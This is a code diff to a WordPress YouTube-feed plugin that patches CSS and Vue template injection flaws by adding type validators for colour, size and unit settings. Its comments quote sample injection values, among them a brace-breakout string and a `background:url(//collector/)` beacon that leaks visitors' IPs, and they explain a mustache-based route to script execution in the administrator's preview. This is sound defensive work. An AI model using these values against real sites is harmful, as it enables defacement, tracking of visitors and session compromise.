@@ -369,49 +369,47 @@ function sby_maybe_palette_styles( $feed_id, $posts, $settings ) {
 
 	$feed_selector = '.' . $custom_palette_class;
 	$header_selector = '.' . trim(SBY_Display_Elements::get_palette_class( $settings, '_header' ));
+	// These six were echoed with esc_html() only, which encodes & < > " ' and leaves `{` and
+	// `}` untouched — so a value like `red}html{display:none` closed the declaration block and
+	// appended document-wide rules. This is the same sink class fixed in sby_custom_feed_styles()
+	// below; route it through the same type validator. (SMASH-1799)
 	$custom_colors = array(
-		'bg1' => $settings['custombgcolor1'],
-        'text1' => $settings['customtextcolor1'],
-        'text2' => $settings['customtextcolor2'],
-        'link1' => $settings['customlinkcolor1'],
-        'button1' => $settings['custombuttoncolor1'],
-        'button2' => $settings['custombuttoncolor2']
-    );
+		'bg1'     => sby_css_color( $settings, 'custombgcolor1' ),
+		'text1'   => sby_css_color( $settings, 'customtextcolor1' ),
+		'text2'   => sby_css_color( $settings, 'customtextcolor2' ),
+		'link1'   => sby_css_color( $settings, 'customlinkcolor1' ),
+		'button1' => sby_css_color( $settings, 'custombuttoncolor1' ),
+		'button2' => sby_css_color( $settings, 'custombuttoncolor2' ),
+	);
+
+	$css = '';
+
+	if ( ! empty( $custom_colors['bg1'] ) ) {
+		$css .= $feed_container . '.sb_youtube.sby_palette_custom { background: ' . $custom_colors['bg1'] . ';}';
+	}
+	if ( ! empty( $custom_colors['text1'] ) ) {
+		$css .= $feed_container . '.sb_youtube.sby_palette_custom .sby_video_title{ color: ' . $custom_colors['text1'] . ';}';
+	}
+	if ( ! empty( $custom_colors['text2'] ) ) {
+		$css .= $feed_container . '.sb_youtube.sby_palette_custom .sby_info .sby_meta{ color: ' . $custom_colors['text2'] . ';}';
+	}
+	if ( ! empty( $custom_colors['link1'] ) ) {
+		$css .= $feed_container . '.sb_youtube.sby_palette_custom .sb_youtube_header .sby_header_text .sby_bio,'
+			. $feed_container . '.sb_youtube.sby_palette_custom .sb_youtube_header .sby_header_text h3,'
+			. $feed_container . '.sb_youtube.sby_palette_custom .sb_youtube_header .sby_header_text .sby_subscribers{ color: ' . $custom_colors['link1'] . ';}';
+	}
+	if ( ! empty( $custom_colors['button1'] ) ) {
+		$css .= $feed_container . '.sb_youtube.sby_palette_custom .sby_follow_btn a { background: ' . $custom_colors['button1'] . ';}';
+	}
+	if ( ! empty( $custom_colors['button2'] ) ) {
+		$css .= $feed_container . '.sb_youtube.sby_palette_custom .sby_footer .sby_load_btn { background: ' . $custom_colors['button2'] . ';}';
+	}
+
+	if ( '' === $css ) {
+		return;
+	}
 	?>
-	<style type="text/css">
-	<?php if ( ! empty( $custom_colors['bg1'] ) ) : ?>
-		<?php echo $feed_container ?>.sb_youtube.sby_palette_custom {
-			background: <?php echo esc_html( $custom_colors['bg1'] ); ?>;
-		}
-    <?php endif; ?>
-	<?php if ( ! empty( $custom_colors['text1'] ) ) : ?>
-		<?php echo $feed_container ?>.sb_youtube.sby_palette_custom .sby_video_title{
-			color: <?php echo esc_html( $custom_colors['text1'] ); ?>;
-		}
-    <?php endif; ?>
-	<?php if ( ! empty( $custom_colors['text2'] ) ) : ?>
-		<?php echo $feed_container ?>.sb_youtube.sby_palette_custom .sby_info .sby_meta{
-			color: <?php echo esc_html( $custom_colors['text2'] ); ?>;
-		}
-    <?php endif; ?>
-	<?php if ( ! empty( $custom_colors['link1'] ) ) : ?>
-		<?php echo $feed_container ?>.sb_youtube.sby_palette_custom .sb_youtube_header .sby_header_text .sby_bio,
-		<?php echo $feed_container ?>.sb_youtube.sby_palette_custom .sb_youtube_header .sby_header_text h3,
-		<?php echo $feed_container ?>.sb_youtube.sby_palette_custom .sb_youtube_header .sby_header_text .sby_subscribers{
-			color: <?php echo esc_html( $custom_colors['link1'] ); ?>;
-		}
-    <?php endif; ?>
-	<?php if ( ! empty( $custom_colors['button1'] ) ) : ?>
-		<?php echo $feed_container ?>.sb_youtube.sby_palette_custom .sby_follow_btn a {
-			background: <?php echo esc_html( $custom_colors['button1'] ); ?>;
-		}
-    <?php endif; ?>
-	<?php if ( ! empty( $custom_colors['button2'] ) ) : ?>
-		<?php echo $feed_container ?>.sb_youtube.sby_palette_custom .sby_footer .sby_load_btn {
-			background: <?php echo esc_html( $custom_colors['button2'] ); ?>;
-		}
-    <?php endif; ?>
-    </style>
+	<style type="text/css"><?php echo esc_html( $css ); ?>    </style>
 	<?php
 }
 add_action( 'sby_after_feed', 'sby_maybe_palette_styles', 1, 3 );
@@ -427,64 +425,73 @@ function sby_custom_feed_styles( $feed_id, $posts, $settings ) {
 		return;
 	}
 
-	echo '<style type="text/css">';
+	// The sixteen values below are type-validated by sby_css_color()/sby_css_int()/sby_css_size(),
+	// which is the control that actually stops a Contributor closing the declaration block with `}`
+	// and appending document-wide rules. The rule text is now assembled into $css and escaped once
+	// at the sink as a second line of defence: esc_html() is a no-op on every legitimate value and
+	// selector emitted here (none contain & < > " '), so it costs nothing today, and it means a
+	// later edit that adds an unvalidated setting still cannot break out of the <style> element
+	// with a literal </style>. (SMASH-1799)
+	$css = '';
 
 	if ( isset( $settings['buttonhovercolor'] ) && !empty( $settings['buttonhovercolor'] ) ) {
-		echo $feed_selector . ' .sby_load_btn:hover { background: ' . $settings['buttonhovercolor'] . ' !important}';
+		$css .= $feed_selector . ' .sby_load_btn:hover { background: ' . sby_css_color( $settings, 'buttonhovercolor' ) . ' !important}';
 	}
 	if ( isset( $settings['customheadertextcolor'] ) && !empty( $settings['customheadertextcolor'] ) ) {
-		echo $feed_selector . ' .sby-header-type-text { color: ' . $settings['customheadertextcolor'] . ' !important}';
+		$css .= $feed_selector . ' .sby-header-type-text { color: ' . sby_css_color( $settings, 'customheadertextcolor' ) . ' !important}';
 	}
 	if ( isset( $settings['descriptiontextsize'] ) && !empty( $settings['descriptiontextsize'] ) ) {
-		echo $feed_selector . ' .sby_caption_wrap .sby_caption { font-size: ' . $settings['descriptiontextsize'] . ' !important}';
+		$css .= $feed_selector . ' .sby_caption_wrap .sby_caption { font-size: ' . sby_css_size( $settings, 'descriptiontextsize' ) . ' !important}';
 	}
 	if ( isset( $settings['subscribehovercolor'] ) && !empty( $settings['subscribehovercolor'] ) ) {
-		echo $feed_selector . ' .sby_follow_btn a:hover { box-shadow:inset 0 0 10px 20px ' . $settings['subscribehovercolor'] . ' !important}';
+		$css .= $feed_selector . ' .sby_follow_btn a:hover { box-shadow:inset 0 0 10px 20px ' . sby_css_color( $settings, 'subscribehovercolor' ) . ' !important}';
 	}
 	if ( isset( $settings['boxedbgcolor'] ) && !empty( $settings['boxedbgcolor'] ) ) {
-		echo $feed_selector . '[data-videostyle=boxed] .sby_items_wrap .sby_item .sby_inner_item { background-color: ' . $settings['boxedbgcolor'] . ' !important}';
+		$css .= $feed_selector . '[data-videostyle=boxed] .sby_items_wrap .sby_item .sby_inner_item { background-color: ' . sby_css_color( $settings, 'boxedbgcolor' ) . ' !important}';
 	}
 	if ( isset( $settings['videocardstyle'] ) && $settings['videocardstyle'] == 'boxed' &&
 		( isset( $settings['boxborderradius'] ) && !empty( $settings['boxborderradius'] ) )
 	) {
-		echo $feed_selector . '[data-videostyle=boxed] .sby_items_wrap .sby_item .sby_inner_item { border-radius: ' . $settings['boxborderradius'] . 'px!important}';
+		$css .= $feed_selector . '[data-videostyle=boxed] .sby_items_wrap .sby_item .sby_inner_item { border-radius: ' . sby_css_int( $settings, 'boxborderradius' ) . 'px!important}';
 		if ( sby_is_pro() ) {
-			echo $feed_selector . sprintf(' .sby_video_thumbnail { border-radius: %spx %spx 0 0 !important}', $settings['boxborderradius'], $settings['boxborderradius']);
+			$css .= $feed_selector . sprintf(' .sby_video_thumbnail { border-radius: %spx %spx 0 0 !important}', sby_css_int( $settings, 'boxborderradius' ), sby_css_int( $settings, 'boxborderradius' ));
 		} else {
-			echo $feed_selector . sprintf(' .sby_video_thumbnail { border-radius: %spx !important}', $settings['boxborderradius']);
+			$css .= $feed_selector . sprintf(' .sby_video_thumbnail { border-radius: %spx !important}', sby_css_int( $settings, 'boxborderradius' ));
 		}
 	}
 	if ( isset( $settings['videodescriptioncolor'] ) && !empty( $settings['videodescriptioncolor'] ) ) {
-		echo $feed_selector . ' .sby_item_caption_wrap { color: ' . $settings['videodescriptioncolor'] . ' !important}';
+		$css .= $feed_selector . ' .sby_item_caption_wrap { color: ' . sby_css_color( $settings, 'videodescriptioncolor' ) . ' !important}';
 	}
 	if ( isset( $settings['videotitlecolor'] ) && !empty( $settings['videotitlecolor'] ) ) {
-		echo $feed_selector . ' .sby_video_title { color: ' . $settings['videotitlecolor'] . ' !important}';
+		$css .= $feed_selector . ' .sby_video_title { color: ' . sby_css_color( $settings, 'videotitlecolor' ) . ' !important}';
 	}
 	if ( isset( $settings['videouserecolor'] ) && !empty( $settings['videouserecolor'] ) ) {
-		echo $feed_selector . ' .sby_meta span.sby_username_wrap { color: ' . $settings['videouserecolor'] . ' !important}';
+		$css .= $feed_selector . ' .sby_meta span.sby_username_wrap { color: ' . sby_css_color( $settings, 'videouserecolor' ) . ' !important}';
 	}
 	if ( isset( $settings['videocountdowncolor'] ) && !empty( $settings['videocountdowncolor'] ) ) {
-		echo $feed_selector . ' .sby_ls_message_wrap .sby_ls_message { background-color: ' . $settings['videocountdowncolor'] . ' !important}';
+		$css .= $feed_selector . ' .sby_ls_message_wrap .sby_ls_message { background-color: ' . sby_css_color( $settings, 'videocountdowncolor' ) . ' !important}';
 	}
 	if ( isset( $settings['videoviewsecolor'] ) && !empty( $settings['videoviewsecolor'] ) ) {
-		echo $feed_selector . ' .sby_meta span.sby_view_count_wrap { color: ' . $settings['videoviewsecolor'] . ' !important}';
+		$css .= $feed_selector . ' .sby_meta span.sby_view_count_wrap { color: ' . sby_css_color( $settings, 'videoviewsecolor' ) . ' !important}';
 	}
 	if ( isset( $settings['videostatscolor'] ) && !empty( $settings['videostatscolor'] ) ) {
-		echo $feed_selector . ' .sby_info .sby_stats { color: ' . $settings['videostatscolor'] . ' !important}';
+		$css .= $feed_selector . ' .sby_info .sby_stats { color: ' . sby_css_color( $settings, 'videostatscolor' ) . ' !important}';
 	}
 	if ( isset( $settings['subscribelinkcolorbg'] ) && !empty( $settings['subscribelinkcolorbg'] ) ) {
-		echo $feed_selector . '.sbc-channel-subscribe-btn button, '. $feed_selector .' .sby-player-info .sby-channel-info-bar .sby-channel-subscribe-btn a { background: ' . $settings['subscribelinkcolorbg'] . ' !important}';
+		$css .= $feed_selector . '.sbc-channel-subscribe-btn button, '. $feed_selector .' .sby-player-info .sby-channel-info-bar .sby-channel-subscribe-btn a { background: ' . sby_css_color( $settings, 'subscribelinkcolorbg' ) . ' !important}';
 	}
 	if ( isset( $settings['subscribebtnprimarycolor'] ) && !empty( $settings['subscribebtnprimarycolor'] ) ) {
-		echo $feed_selector . ' .sby-video-header-info h5, '. $feed_selector .' .sby-channel-info-bar .sby-channel-name { color: ' . $settings['subscribebtnprimarycolor'] . ' !important}';
+		$css .= $feed_selector . ' .sby-video-header-info h5, '. $feed_selector .' .sby-channel-info-bar .sby-channel-name { color: ' . sby_css_color( $settings, 'subscribebtnprimarycolor' ) . ' !important}';
 	}
 	if ( isset( $settings['subscribebtnsecondarycolor'] ) && !empty( $settings['subscribebtnsecondarycolor'] ) ) {
-		echo $feed_selector . ' .sby-channel-info-bar .sby-channel-subscriber-count, '. $feed_selector .' .sby-video-header-info .sby-video-header-meta { color: ' . $settings['subscribebtnsecondarycolor'] . ' !important}';
+		$css .= $feed_selector . ' .sby-channel-info-bar .sby-channel-subscriber-count, '. $feed_selector .' .sby-video-header-info .sby-video-header-meta { color: ' . sby_css_color( $settings, 'subscribebtnsecondarycolor' ) . ' !important}';
 	}
 	if ( isset( $settings['subscribebtntextcolor'] ) && !empty( $settings['subscribebtntextcolor'] ) ) {
-		echo $feed_selector . '.sbc-channel-subscribe-btn button, '. $feed_selector .' .sby-player-info .sby-channel-info-bar .sby-channel-subscribe-btn a { color: ' . $settings['subscribebtntextcolor'] . ' !important}';
+		$css .= $feed_selector . '.sbc-channel-subscribe-btn button, '. $feed_selector .' .sby-player-info .sby-channel-info-bar .sby-channel-subscribe-btn a { color: ' . sby_css_color( $settings, 'subscribebtntextcolor' ) . ' !important}';
 	}
 
+	echo '<style type="text/css">';
+	echo esc_html( $css );
 	echo '</style>';
 }
 
@@ -579,9 +586,11 @@ function sby_rand_sort( $a, $b ) {
  * @return string
  */
 function sby_hextorgb( $hex ) {
-	// allows someone to use rgb in shortcode
+	// allows someone to use rgb in shortcode — but the result is concatenated into a
+	// style attribute inside a JS-built HTML string, so a comma alone must not be a
+	// free pass for arbitrary bytes (SMASH-1799).
 	if ( strpos( $hex, ',' ) !== false ) {
-		return $hex;
+		return preg_match( '/^\s*\d{1,3}\s*,\s*\d{1,3}\s*,\s*\d{1,3}\s*$/', $hex ) ? $hex : '';
 	}
 
 	$hex = str_replace( '#', '', $hex );
@@ -824,7 +833,7 @@ function sby_get_installed_plugin_info() {
 			'displayName' => __( 'Facebook', 'feeds-for-youtube' ),
 			'name' => __( 'Facebook Feed', 'feeds-for-youtube' ),
 			'author' => __( 'By Smash Balloon', 'feeds-for-youtube' ),
-			'description' => __('To display a Facebook feed, our Facebook plugin is required. </br> It provides a clean and beautiful way to add your Facebook posts to your website. Grab your visitors attention and keep them engaged with your site longer.', 'feeds-for-youtube'),
+			'description' => __( 'To display a Facebook feed, our Facebook plugin is required. </br> It provides a clean and beautiful way to add your Facebook posts to your website. Grab your visitors\' attention and keep them engaged with your site longer.', 'feeds-for-youtube' ),
 			'dashboard_permalink' => admin_url( 'admin.php?page=cff-feed-builder' ),
 			'svgIcon' => '<svg viewBox="0 0 14 15"  width="36" height="36"><path d="M7.00016 0.860001C3.3335 0.860001 0.333496 3.85333 0.333496 7.54C0.333496 10.8733 2.7735 13.64 5.96016 14.14V9.47333H4.26683V7.54H5.96016V6.06667C5.96016 4.39333 6.9535 3.47333 8.48016 3.47333C9.20683 3.47333 9.96683 3.6 9.96683 3.6V5.24667H9.12683C8.30016 5.24667 8.04016 5.76 8.04016 6.28667V7.54H9.8935L9.5935 9.47333H8.04016V14.14C9.61112 13.8919 11.0416 13.0903 12.0734 11.88C13.1053 10.6697 13.6704 9.13043 13.6668 7.54C13.6668 3.85333 10.6668 0.860001 7.00016 0.860001Z" fill="rgb(0, 107, 250)"/></svg>',
 			'installed' => isset( $sb_other_plugins['is_facebook_installed'] ) && $sb_other_plugins['is_facebook_installed'] == true,
@@ -838,7 +847,7 @@ function sby_get_installed_plugin_info() {
 			'displayName' => __( 'Instagram', 'feeds-for-youtube' ),
 			'name' => __( 'Instagram Feed', 'feeds-for-youtube' ),
 			'author' => __( 'By Smash Balloon', 'feeds-for-youtube' ),
-			'description' => __('To display an Instagram feed, our Instagram plugin is required. </br> It provides a clean and beautiful way to add your Instagram posts to your website. Grab your visitors attention and keep them engaged with your site longer.', 'feeds-for-youtube'),
+			'description' => __( 'To display an Instagram feed, our Instagram plugin is required. </br> It provides a clean and beautiful way to add your Instagram posts to your website. Grab your visitors\' attention and keep them engaged with your site longer.', 'feeds-for-youtube' ),
 			'dashboard_permalink' => admin_url( 'admin.php?page=sbi-feed-builder' ),
 			'svgIcon' => '<svg width="36" height="36" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18 9.91406C13.5 9.91406 9.91406 13.5703 9.91406 18C9.91406 22.5 13.5 26.0859 18 26.0859C22.4297 26.0859 26.0859 22.5 26.0859 18C26.0859 13.5703 22.4297 9.91406 18 9.91406ZM18 23.2734C15.1172 23.2734 12.7266 20.9531 12.7266 18C12.7266 15.1172 15.0469 12.7969 18 12.7969C20.8828 12.7969 23.2031 15.1172 23.2031 18C23.2031 20.9531 20.8828 23.2734 18 23.2734ZM28.2656 9.63281C28.2656 8.57812 27.4219 7.73438 26.3672 7.73438C25.3125 7.73438 24.4688 8.57812 24.4688 9.63281C24.4688 10.6875 25.3125 11.5312 26.3672 11.5312C27.4219 11.5312 28.2656 10.6875 28.2656 9.63281ZM33.6094 11.5312C33.4688 9 32.9062 6.75 31.0781 4.92188C29.25 3.09375 27 2.53125 24.4688 2.39062C21.8672 2.25 14.0625 2.25 11.4609 2.39062C8.92969 2.53125 6.75 3.09375 4.85156 4.92188C3.02344 6.75 2.46094 9 2.32031 11.5312C2.17969 14.1328 2.17969 21.9375 2.32031 24.5391C2.46094 27.0703 3.02344 29.25 4.85156 31.1484C6.75 32.9766 8.92969 33.5391 11.4609 33.6797C14.0625 33.8203 21.8672 33.8203 24.4688 33.6797C27 33.5391 29.25 32.9766 31.0781 31.1484C32.9062 29.25 33.4688 27.0703 33.6094 24.5391C33.75 21.9375 33.75 14.1328 33.6094 11.5312ZM30.2344 27.2812C29.7422 28.6875 28.6172 29.7422 27.2812 30.3047C25.1719 31.1484 20.25 30.9375 18 30.9375C15.6797 30.9375 10.7578 31.1484 8.71875 30.3047C7.3125 29.7422 6.25781 28.6875 5.69531 27.2812C4.85156 25.2422 5.0625 20.3203 5.0625 18C5.0625 15.75 4.85156 10.8281 5.69531 8.71875C6.25781 7.38281 7.3125 6.32812 8.71875 5.76562C10.7578 4.92188 15.6797 5.13281 18 5.13281C20.25 5.13281 25.1719 4.92188 27.2812 5.76562C28.6172 6.25781 29.6719 7.38281 30.2344 8.71875C31.0781 10.8281 30.8672 15.75 30.8672 18C30.8672 20.3203 31.0781 25.2422 30.2344 27.2812Z" fill="url(#paint0_linear)"/><defs><linearGradient id="paint0_linear" x1="13.4367" y1="62.5289" x2="79.7836" y2="-5.19609" gradientUnits="userSpaceOnUse"><stop stop-color="white"/><stop offset="0.147864" stop-color="#F6640E"/><stop offset="0.443974" stop-color="#BA03A7"/><stop offset="0.733337" stop-color="#6A01B9"/><stop offset="1" stop-color="#6B01B9"/></linearGradient></defs></svg>',
 			'installed' => isset( $sb_other_plugins['is_instagram_installed'] ) && $sb_other_plugins['is_instagram_installed'] == true,
@@ -1105,4 +1114,210 @@ function sby_utm_campaign() {
 		return 'youtube-pro';
 	}
 	return 'youtube-free';
+}
+
+if ( ! function_exists( 'sby_css_color' ) ) {
+	/**
+	 * Validate a feed setting that is emitted into a CSS declaration as a colour.
+	 *
+	 * sby_custom_feed_styles() concatenated sixteen settings straight into a <style>
+	 * element, and SBY_Settings' broad wp_parse_args( $atts, $db ) merge lets any
+	 * shortcode or block attribute override the saved value — so a Contributor could
+	 * close the plugin's declaration block with `}` and append document-wide rules
+	 * (html{display:none}, a click-harvesting overlay, or a background:url() that leaks
+	 * every visitor's IP and referrer). Braces are not HTML metacharacters, so no output
+	 * escaper removes them: the value has to be validated by TYPE. safecss_filter_attr()
+	 * is not enough on its own here — it rejects a declaration containing `}` but still
+	 * accepts background:url(). SMASH-1799.
+	 *
+	 * @param array  $settings Feed settings.
+	 * @param string $key      Setting key.
+	 * @return string Hex or rgb()/rgba() colour, or '' when the value is not a colour.
+	 */
+	function sby_css_color( $settings, $key ) {
+		$value = isset( $settings[ $key ] ) ? trim( (string) $settings[ $key ] ) : '';
+
+		if ( '' === $value ) {
+			return '';
+		}
+
+		// The customizer's colour controls emit rgba() as well as hex, so a hex-only
+		// validator would silently drop legitimate saved colours.
+		// The alpha group accepts 1.0 and .5 as well as 0.5, because a hex-only or
+		// stricter-alpha validator would silently drop the rule rather than fail loudly.
+		if ( preg_match( '/^rgba?\(\s*\d{1,3}\s*,\s*\d{1,3}\s*,\s*\d{1,3}\s*(,\s*(0|1|[01]?\.\d+)\s*)?\)$/', $value ) ) {
+			return $value;
+		}
+
+		$candidate = '#' === substr( $value, 0, 1 ) ? $value : '#' . $value;
+
+		// sanitize_hex_color() rejects 8-digit #rrggbbaa, which the colour controls can emit.
+		if ( preg_match( '/^#([0-9a-fA-F]{4}|[0-9a-fA-F]{8})$/', $candidate ) ) {
+			return $candidate;
+		}
+
+		$hex = sanitize_hex_color( $candidate );
+
+		return $hex ? $hex : '';
+	}
+}
+
+if ( ! function_exists( 'sby_css_int' ) ) {
+	/**
+	 * Validate a feed setting emitted into CSS as a bare integer (SMASH-1799).
+	 *
+	 * Used for rules that append their own unit — boxborderradius is concatenated with
+	 * 'px!important' and passed through sprintf( '%spx' ), so returning '12px' here would
+	 * emit '12pxpx'. The stored default is the bare string '12'.
+	 *
+	 * @param array  $settings Feed settings.
+	 * @param string $key      Setting key.
+	 * @return string
+	 */
+	function sby_css_int( $settings, $key ) {
+		$value = isset( $settings[ $key ] ) ? (int) $settings[ $key ] : 0;
+
+		return ( $value >= 0 && $value <= 200 ) ? (string) $value : '';
+	}
+}
+
+if ( ! function_exists( 'sby_css_size' ) ) {
+	/**
+	 * Validate a feed setting emitted into CSS as a pixel size (SMASH-1799).
+	 *
+	 * descriptiontextsize is a select limited to 12px-20px, so it is matched against that
+	 * shape rather than cast; a bare integer is accepted and suffixed.
+	 *
+	 * @param array  $settings Feed settings.
+	 * @param string $key      Setting key.
+	 * @return string
+	 */
+	function sby_css_size( $settings, $key ) {
+		$value = isset( $settings[ $key ] ) ? trim( (string) $settings[ $key ] ) : '';
+
+		if ( preg_match( '/^\d{1,3}px$/', $value ) ) {
+			return $value;
+		}
+
+		$int = (int) $value;
+
+		return ( $int > 0 && $int <= 200 ) ? $int . 'px' : '';
+	}
+}
+
+if ( ! function_exists( 'sby_css_unit' ) ) {
+	/**
+	 * Validate a CSS length unit emitted into a style attribute (SMASH-1799).
+	 *
+	 * The *unit settings are appended to an (int)-cast number inside style="…", where
+	 * esc_attr() stops the attribute being escaped but not a further declaration being
+	 * appended inside it — `widthunit="px;background:url(//collector/)"` yields
+	 * style="width: 100px;background:url(//collector/);" and beacons every visitor's IP
+	 * and referrer. Only the unit tokens the settings UI can produce are allowed.
+	 *
+	 * @param array  $settings Feed settings.
+	 * @param string $key      Setting key.
+	 * @param string $fallback Unit to use when the stored value is not a known unit.
+	 * @return string
+	 */
+	function sby_css_unit( $settings, $key, $fallback = 'px' ) {
+		$value = isset( $settings[ $key ] ) ? trim( (string) $settings[ $key ] ) : '';
+
+		return in_array( $value, array( 'px', '%', 'em', 'rem', 'vw', 'vh' ), true ) ? $value : $fallback;
+	}
+}
+
+if ( ! function_exists( 'sby_css_length' ) ) {
+	/**
+	 * Validate a CSS length that may already carry its own unit (SMASH-1799).
+	 *
+	 * itemspacing is used verbatim when it already contains px or %, so it reaches a style
+	 * attribute unvalidated. Accept only a number with an optional known unit.
+	 *
+	 * @param string $value Raw stored value.
+	 * @return string Validated length, or '' when it is not one.
+	 */
+	function sby_css_length( $value ) {
+		$value = trim( (string) $value );
+
+		return preg_match( '/^\d{1,4}(\.\d{1,3})?(px|%|em|rem|vw|vh)?$/', $value ) ? $value : '';
+	}
+}
+
+if ( ! function_exists( 'sby_neutralize_vue_delimiters' ) ) {
+	/**
+	 * Neutralise Vue mustache delimiters in a builder-preview string.
+	 *
+	 * The customizer mounts the server-rendered preview as a Vue component TEMPLATE, so
+	 * `{{ ... }}` inside it is an evaluated JavaScript expression rather than markup.
+	 * Braces are not HTML metacharacters, so no escaper on the render path (esc_html,
+	 * sby_esc_html_with_br, esc_attr, wp_kses) touches them — a YouTube video title,
+	 * description, channel title or bio therefore reaches code execution in the
+	 * administrator's session with no angle bracket, quote or on* attribute. Encoding the
+	 * delimiters means Vue's parser never tokenises a mustache, while the browser still
+	 * renders the original characters as text. SMASH-1799.
+	 *
+	 * @param string $html Rendered feed HTML destined for the builder preview.
+	 * @return string
+	 */
+	function sby_neutralize_vue_delimiters( $html ) {
+		// HTML entities do NOT work here. Vue 2's compiler decodes the text node before it
+		// looks for delimiters — chars() calls decodeHTMLCached( text ) and only then
+		// parseText( text, delimiters ) — so `&#123;&#123;` is turned back into `{{` and
+		// tokenised as an interpolation anyway. Splitting the pair with an empty comment
+		// works because the split happens in the HTML parser, one layer earlier: the comment
+		// ends the text node, so parseText() never sees two adjacent braces. Vue strips
+		// comment nodes from the render, and the browser renders `{` + `{` as `{{`, so the
+		// visible text is unchanged. (SMASH-1799)
+		return str_replace(
+			array( '{{', '}}' ),
+			array( '{<!---->{', '}<!---->}' ),
+			(string) $html
+		);
+	}
+}
+
+if ( ! function_exists( 'sby_init_consent_manager' ) ) {
+	/**
+	 * Initialize the shared Consent (data-sharing / notifications) manager.
+	 *
+	 * Defined once here and called from both the Free (youtube-feed.php) and
+	 * Pro (youtube-feed-pro.php) entry points so the init array is not repeated
+	 * verbatim in both bootstrap files.
+	 */
+	function sby_init_consent_manager() {
+		if ( ! class_exists( '\SmashBalloon\YoutubeFeed\Vendor\Smashballoon\Framework\Packages\Consent\ConsentManager' ) ) {
+			return;
+		}
+
+		$sby_pro = function_exists( 'sby_is_pro' ) && sby_is_pro();
+		\SmashBalloon\YoutubeFeed\Vendor\Smashballoon\Framework\Packages\Consent\ConsentManager::init( array(
+			'plugin_slug'         => 'feeds-for-youtube',
+			'plugin_name'         => $sby_pro ? 'Feeds for YouTube Pro' : 'Feeds for YouTube',
+			'utm_slug'            => 'youtube',
+			'legacy_class'        => 'SBY_Consent',
+			'is_pro'              => $sby_pro,
+			'pro_init_option'     => $sby_pro ? 'sby_pro_consent_initialized' : null,
+			// SMASH-2630: sites that had opted in to usage tracking keep sharing
+			// after the consent update (run once by the package). Reads the raw
+			// toggle, because Config::is_enabled() already includes the consent gate.
+			'legacy_optin'        => static function () {
+				$sby_settings = get_option( 'sby_settings', array() );
+				return is_array( $sby_settings ) && ! empty( $sby_settings['usagetracking'] );
+			},
+			'show_reprompt_modal' => $sby_pro ? false : function ( $show ) {
+				// The filter is shared by every Smash Balloon plugin, so only gate on
+				// our own pages or a pending wizard hides the modal for all of them.
+				$page = isset( $_GET['page'] ) ? sanitize_key( wp_unslash( $_GET['page'] ) ) : ''; // phpcs:ignore WordPress.Security.NonceVerification.Recommended
+				if ( 0 !== strpos( $page, 'sby-' ) && 0 !== strpos( $page, 'youtube-feed' ) ) {
+					return $show;
+				}
+				$cls = '\SmashBalloon\YouTubeFeed\Services\Admin\Settings\SetupPage';
+				if ( class_exists( $cls ) && method_exists( $cls, 'should_init_wizard' ) && $cls::should_init_wizard() ) {
+					return false;
+				}
+				return $show;
+			},
+		) );
+	}
 }
